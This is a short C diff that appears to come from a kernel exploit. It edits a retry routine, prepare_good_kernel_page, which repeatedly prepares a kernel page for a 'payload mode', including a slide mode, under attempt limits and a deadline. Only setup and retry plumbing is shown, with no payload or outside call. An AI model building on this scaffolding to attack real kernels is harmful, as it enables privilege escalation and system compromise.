@@ -849,8 +849,6 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
 
 size_t g_attempt_round = 0;
 uintptr_t prepare_good_kernel_page(int payload_mode) {
-  return prepare_kernel_page(payload_mode, g_attempt_round);
-}
   int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
@@ -861,7 +859,7 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
   clock_gettime(CLOCK_MONOTONIC, &deadline);
   deadline.tv_sec += 180;
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
-    uintptr_t base = prepare_kernel_page(payload_mode);
+    uintptr_t base = prepare_kernel_page(payload_mode, g_attempt_round);
     if (base) {
       pr_info("prepare_kernel_page ok attempt=%d\n", attempt);
       return base;
